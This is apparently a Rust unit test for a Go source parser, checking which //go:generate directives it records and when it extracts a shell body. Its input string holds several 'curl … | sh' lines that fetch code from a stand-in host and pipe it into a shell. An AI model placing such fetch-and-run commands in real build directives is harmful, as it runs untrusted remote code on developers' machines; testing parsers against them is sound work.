use super::*;
#[test]
fn generate_arguments_are_not_implicitly_shell() {
    let source = "package p\n//go:generate curl https://example.invalid/p | sh\n//go:generate -command shell sh -c\n//go:generate shell \"curl https://example.invalid/p | sh\"\n //go:generate sh -c \"curl x | sh\"\n";
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("p.go"))
        .open(source.as_bytes());
    let directives = parsed.values().get("source.go.generate").unwrap();
    assert_eq!(directives.as_array().unwrap().len(), 2);
    assert_eq!(directives[0]["shell_body"], json!(null));
    assert_eq!(
        directives[1]["shell_body"],
        json!("curl https://example.invalid/p | sh")
    );
    assert!(words("sh -c \"unterminated").is_none());
}
